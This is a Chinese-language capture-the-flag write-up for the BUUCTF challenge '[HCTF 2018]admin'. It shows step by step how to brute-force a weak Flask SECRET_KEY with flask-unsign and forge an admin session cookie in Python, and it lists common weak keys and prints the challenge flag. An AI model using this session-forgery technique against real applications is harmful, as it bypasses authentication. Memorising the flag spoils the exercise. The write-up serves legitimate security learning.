---
title: "[HCTF 2018]admin"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [flask-session-forgery, session-hijacking, weak-secret-key]
vulnerability: Flask session使用弱密钥签名，可被暴力破解并伪造admin身份
solved: true
flag: "flag{f3bfd765-5e2a-4040-a015-71a67369056f}"
---

# [HCTF 2018]admin

## 题目概述
题目是一个基于 Flask 的 Web 应用，包含登录、注册、修改密码等功能。首页注释提示 "you are not admin"，需要以 admin 身份登录才能获取 flag。

## 信息收集
1. 访问首页发现是 Flask 应用，注释提示需要 admin 身份
2. 注册页面有验证码功能，验证码存储在 Flask session 中
3. 修改密码页面源码注释发现 GitHub 链接：`https://github.com/woadsl1234/hctf_flask/`
4. 登录后分析 Flask session cookie 结构，发现包含 `name` 字段存储用户名

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**: Flask Session 伪造（弱密钥）

**原理**: Flask 使用 `itsdangerous` 库对 session 进行签名，而非加密。session 数据使用 base64+zlib 压缩编码，只需知道 SECRET_KEY 就可伪造任意用户的 session。

**判断过程**:
1. 分析 Flask session cookie 结构：`.payload.timestamp.signature`
2. 使用 `flask-unsign` 工具暴力破解 SECRET_KEY
3. 成功破解出密钥为 `ckj123`

## 利用过程（Payload + Flag）

### 1. 破解 Flask SECRET_KEY
```bash
# 使用 flask-unsign 暴力破解
flask-unsign --unsign --cookie "<session_cookie>" --wordlist wordlist.txt --no-literal-eval
# 结果: ckj123
```

### 2. 伪造 admin session
```python
from flask_unsign import sign

# 构造 admin session
admin_session = {
    '_fresh': True,
    '_id': b'<valid_session_id>',
    'csrf_token': b'<valid_csrf_token>',
    'name': 'admin',  # 关键：修改为 admin
    'user_id': '<any_user_id>'
}

# 使用破解的密钥签名
forged_cookie = sign(admin_session, 'ckj123', salt='cookie-session')
```

### 3. 获取 Flag
```python
import requests

session = requests.Session()
session.cookies.set('session', forged_cookie)
resp = session.get(url)
# 响应中包含: flag{f3bfd765-5e2a-4040-a015-71a67369056f}
```

## 复现步骤
1. 注册普通用户并登录，获取有效 session cookie
2. 使用 `flask-unsign` 暴力破解 SECRET_KEY
3. 修改 session 中的 `name` 字段为 `admin`
4. 使用破解的密钥重新签名 session
5. 携带伪造的 cookie 访问首页获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| Flask Session伪造 | 弱SECRET_KEY | `sign({'name':'admin'}, 'ckj123')` | Flask session签名机制、itsdangerous库 |

## 知识总结（解题技巧、同类题型套路）
1. **Flask Session 特点**: 签名而非加密，数据可解码，密钥泄露可伪造
2. **破解工具**: `flask-unsign` 可暴力破解常见密钥
3. **常见弱密钥**: `secret`, `secret_key`, `password`, `admin`, `ckj123` 等
4. **Session 结构**: `_fresh`, `_id`, `csrf_token`, `name`, `user_id` 等字段
5. **同类题型**: 遇到 Flask 应用优先尝试 session 伪造，检查是否有弱密钥
